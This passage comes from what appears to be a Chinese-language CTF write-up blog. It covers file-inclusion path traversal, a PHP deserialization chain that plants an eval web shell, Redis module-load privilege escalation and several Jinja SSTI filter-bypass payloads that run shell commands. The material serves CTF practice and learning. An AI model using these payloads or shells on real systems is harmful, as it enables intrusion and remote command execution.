class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">emmm</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\">&amp;<span class=\"variable\">$page</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&quot;source&quot;</span> =&gt; <span class=\"string\">&quot;source.php&quot;</span>, <span class=\"string\">&quot;hint&quot;</span> =&gt; <span class=\"string\">&quot;hint.php&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$page</span>) || !<span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$page</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$page</span>, <span class=\"variable\">$whitelist</span>)) &#123;<span class=\"comment\">//检查传的file值是否再whitelist中</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">mb_substr</span>(</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable\">$page</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"number\">0</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"title function_ invoke__\">mb_strpos</span>(<span class=\"variable\">$page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$page</span>);<span class=\"comment\">//将file进行url解码赋值给$_page</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">mb_substr</span>(//相当于substr,可以返回中文字符</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable\">$_page</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"number\">0</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"title function_ invoke__\">mb_strpos</span>(<span class=\"variable\">$_page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)//给_page后加个?,再返回第一次出现?的位置</span><br><span class=\"line\"></span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (</span><br><span class=\"line\"></span><br><span class=\"line\">    !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//要传个参名字为file</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//传的file要是字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &amp;&amp; emmm::<span class=\"title function_ invoke__\">checkFile</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//调用checkFile函数只要能通过就行</span></span><br><span class=\"line\"></span><br><span class=\"line\">) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>];<span class=\"comment\">//直接调用得flag</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*payload:</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">?file=hint.php?../../../../../../ffffllllaaaagggg</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">file=hint.php%3f../../../../../../ffffllllaaaagggg  %3f是?的url编码</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"17天翼杯-2021esay_evalredis\"><a class=\"markdownIt-Anchor\" href=\"#17天翼杯-2021esay_evalredis\">#</a> 17.[天翼杯 2021] esay_eval–REDIS]</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$code</span> = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;code=<span class=\"string\">&quot;eval(\\$_POST[1]);&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">A</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">b</span>());</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这题链子不难找，绕过 wakeup 的正则表达式绕过用大小写绕过<br>\n学习一个新知识:redis 提权<br>\n！[[Pasted image 20230502170947.png]]<br>\n antsword 连接上去后发现不能访问其他目录，发现一个 config.php.swp 内容有 redis 密码<br>\n蚁剑 Redis 插件地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/Medicean/AS_Redis</span><br></pre></td></tr></table></figure>\n<p>git clone 到 antData/plugins 下<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1leHAtcDE4ZHZiMmw0OWQuc28=\">上传一个 exp.so</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">文件地址：https://github.com/Dliv3/redis-rogue-server</span><br></pre></td></tr></table></figure>\n<p>蚁剑连上插件后添加数据密码填文件里的<br>\n直接执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MODULE LOAD /var/www/html/exp.so</span><br><span class=\"line\">system.exec &quot;命令&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"18安洵杯-2020normal-ssti\"><a class=\"markdownIt-Anchor\" href=\"#18安洵杯-2020normal-ssti\">#</a> 18.[安洵杯 2020] Normal SSTI</h3>\n<p>此题考点 unicode 编码绕过，ssti 过滤<br>\n先测试一下发现过滤了 <code>&#123;&#123;&#125;&#125;,空格,点号</code> <br>\n先找一个通用 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())%&#125;</span><br></pre></td></tr></table></figure>\n<p>点号可以用 attr 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure>\n<p>但是此题还过滤了下划线，这里解锁一种新的绕过方法：Unicode 编码绕过<br>\n先用 gpt 写一段脚本:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 定义一个空列表，用于存储每个字符的Unicode编码  </span></span><br><span class=\"line\">unicode_lst = []  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># 输入需要转换的字符串  </span></span><br><span class=\"line\">input_str = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入要转换的字符串：&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># 遍历输入字符串，并将每个字符的Unicode编码按照 \\uXXXX 的形式存储到unicode_lst列表中  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> input_str:  </span><br><span class=\"line\">unicode_lst.append(<span class=\"string\">&quot;\\\\u%04x&quot;</span> % <span class=\"built_in\">ord</span>(char))  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># 打印转换结果  </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;转换结果：&quot;</span>, <span class=\"string\">&quot;&quot;</span>.join(unicode_lst))</span><br></pre></td></tr></table></figure>\n<p>需要什么自己转换就行了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__globals__:\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f</span><br><span class=\"line\">__getitem__:\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f</span><br><span class=\"line\">注意哦这里还过滤了一些关键字:popen,flag</span><br><span class=\"line\">popen:\\u0070\\u006f\\u0070\\u0065\\u006e</span><br><span class=\"line\">空格:\\u0020</span><br><span class=\"line\">flag:\\u0066\\u006c\\u0061\\u0067</span><br></pre></td></tr></table></figure>\n<p>合在一起:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;os&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;cat\\u0020/\\u0066\\u006c\\u0061\\u0067&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"19hnctf-2022-week3ssssti\"><a class=\"markdownIt-Anchor\" href=\"#19hnctf-2022-week3ssssti\">#</a> 19.[HNCTF 2022 WEEK3]ssssti</h3>\n<p>测试一些？name=…<br>\n 发现过滤单双引号，下划线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum.__globals__.get(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;config[request.values.a][request.values.b][request.values.c][request.values.d].popen(request.values.e).read() &#125;&#125;&amp;a=__class__&amp;b=__init__&amp;c=__globals__&amp;d=os&amp;e=ls</span><br></pre></td></tr></table></figure>\n<h3 id=\"20gdouctf-2023ez_ze\"><a class=\"markdownIt-Anchor\" href=\"#20gdouctf-2023ez_ze\">#</a> 20.[GDOUCTF 2023]&lt;ez_ze&gt;</h3>\n<p>测试发现过滤了 <code>&#123;&#123;&#125;&#125;,点号,下划线,双引号(单引号没有过滤),[],关键字getitem,os,popen(注意这里的set)</code> <br>\n 这里我们来试试 set 方法绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常用payload:</span><br><span class=\"line\">&#123;%print(lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(&#x27;ls /&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br></pre></td></tr></table></figure>\n<p>开干:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看下划线的位置18和24</span><br><span class=\"line\">&#123;%print(lipsum|string|list)%&#125;</span><br><span class=\"line\">构建pop字符串</span><br><span class=\"line\">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;%set xhx=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">&#123;%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join()%&#125;</span><br><span class=\"line\">&#123;%set geti=(xhx,xhx,dict(get=a)|join,dict(item=a)|join,xhx,xhx)|join%&#125;</span><br><span class=\"line\">&#123;%set oo=(dict(o=a)|join,dict(s=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;%set poe=(dict(pop=a)|join,dict(en=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;%print(lipsum|attr(globals)|attr(geti)(oo)|attr(poe)(&#x27;ls /&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">再改一下命令为cat /flag就行</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"21gdouctf-2023受不了一点\"><a class=\"markdownIt-Anchor\" href=\"#21gdouctf-2023受不了一点\">#</a> 21.[GDOUCTF 2023] 受不了一点</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$b</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>] != <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$b</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;cookie&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;cookie&#x27;</span>] == <span class=\"string\">&#x27;j0k3r&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;bbb&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"variable\">$aaa</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"variable\">$bbb</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;bbb&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"variable\">$aaa</span> == <span class=\"number\">114514</span> &amp;&amp; <span class=\"variable\">$bbb</span> == <span class=\"number\">114514</span> &amp;&amp; <span class=\"variable\">$aaa</span> != <span class=\"variable\">$bbb</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"variable\">$give</span> = <span class=\"string\">&#x27;cancanwordflag&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"variable\">$get</span> = <span class=\"string\">&#x27;hacker!&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"keyword\">die</span>(<span class=\"variable\">$give</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>] === <span class=\"string\">&#x27;flag&#x27;</span> || <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>] === <span class=\"string\">&#x27;flag&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"keyword\">die</span>(<span class=\"variable\">$get</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$_POST</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"variable\">$$key</span> = <span class=\"variable\">$value</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$_GET</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"variable\">$$key</span> = <span class=\"variable\">$$value</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;洗洗睡吧&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;行不行啊细狗&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;菜菜&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span 